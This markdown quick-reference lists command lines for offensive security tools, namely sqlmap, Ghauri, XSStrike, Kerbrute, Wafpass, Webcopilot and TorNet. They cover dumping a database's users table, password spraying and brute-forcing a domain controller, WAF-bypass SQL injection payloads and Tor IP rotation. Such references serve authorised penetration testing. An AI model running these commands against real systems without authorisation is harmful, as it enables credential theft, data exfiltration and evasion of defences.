# Security Tools Commands Guide

This document is a collection of commands for various security tools including SQLMC, Xsstrike, Sqlmap, Ghauri, Kerbrute, Webcopilot, Wafpass, and TorNet. Each section includes essential commands and customizable options to enhance your security testing and vulnerability assessment tasks.

---

## SQLMC
- **Basic Command**: `sqlmc -u http://example.com -d 2 -o Output_file`

---

## Xsstrike
- **Basic Usage**: `python3 xsstrike.py -u http://example.com`
- **Scan URL List**: `python3 xsstrike.py --file urls.txt`
- **Crawl Mode**: `python3 xsstrike.py --crawl -u http://example.com/`
- **Use Proxy**: `python3 xsstrike.py -u "http://example.com/" --proxy http://127.0.0.1:8080`
- **Custom User-Agent**: `python3 xsstrike.py -u "http://example.com/" --user-agent "Mozilla/5.0"`
- **Specify Cookies**: `python3 xsstrike.py -u "http://example.com/" --cookie "sessionid=abc123; user=admin"`
- **HTTP Headers**: `python3 xsstrike.py -u "http://example.com/" --headers "Authorization: Bearer token123"`
- **Fuzzing Mode**: `python3 xsstrike.py -u "http://example.com/search.php?q=test" --fuzzer`
- **Blind XSS**: `python3 xsstrike.py -u "http://example.com/search.php?q=test" --payload "<script>...</script>"`

---

## Sqlmap
- **Basic Command**: `sqlmap -u http://example.com/page.php?id=1`
- **Request Method (GET/POST)**: `sqlmap -u "http://example.com/page.php?id=1" --method=POST --data="username=admin&password=admin"`
- **HTTP Headers**: `sqlmap -u "http://example.com/page.php?id=1" --headers="User-Agent: Mozilla/5.0"`
- **Database Enumeration**: `sqlmap -u "http://example.com/page.php?id=1" --dbs`
- **Enumerate Tables**: `sqlmap -u "http://example.com/page.php?id=1" -D targetdb --tables`
- **Dump Table Data**: `sqlmap -u "http://example.com/page.php?id=1" -D targetdb -T users --dump`
- **Injection Techniques**: `sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST`
- **Tamper Scripts**: `sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment`

---

## Ghauri
- **Basic Usage**: `python3 ghauri.py -u http://example.com/page.php?id=1`
- **POST Request**: `python3 ghauri.py -u "http://example.com/page.php" --data="id=1"`
- **User-Agent**: `python3 ghauri.py -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0"`
- **Cookies**: `python3 ghauri.py -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abcdef123456"`
- **Blind SQL Injection Detection**: `python3 ghauri.py -u "http://example.com/page.php?id=1" --technique=B`
- **Output to File**: `python3 ghauri.py -u "http://example.com/page.php?id=1" --output-file=results.txt`

---

## Kerbrute
- **Username Enumeration**: `./kerbrute_linux_amd64 userenum -d example.com --dc 192.168.1.10 usernames.txt`
- **Password Spray Attack**: `./kerbrute_linux_amd64 passwordspray -d example.com --dc 192.168.1.10 usernames.txt -p Password123`
- **Brute Force**: `./kerbrute_linux_amd64 bruteforce -d example.com --dc 192.168.1.10 usernames.txt passwords.txt`

---

## Webcopilot
- **Target Specification**: `webcopilot -u http://example.com`
- **Crawl Website**: `webcopilot -u "http://example.com" --crawl`
- **SQL Injection Scan**: `webcopilot -u "http://example.com" --sqlscan`
- **XSS Scan**: `webcopilot -u "http://example.com" --xss`
- **Directory Brute-forcing**: `webcopilot -u "http://example.com" --dirbrute`
- **Save Output**: `webcopilot -u "http://example.com" --output report.txt`

---

## Wafpass
- **Basic Payload Testing**: `wafpass -u "http://example.com" --payload "1' OR '1'='1"`
- **Encoding Techniques**: `wafpass -u "http://example.com" --encode base64`
- **Custom Headers**: `wafpass -u "http://example.com" --headers "X-Forwarded-For: 127.0.0.1"`

---

## TorNet
- **Basic Usage**: `sudo tornet --interval 5 --count 0`

---

This guide aims to provide a quick reference for each tool's basic and advanced commands. Each section contains different flags and parameters to tailor your security testing efforts as per your requirements.
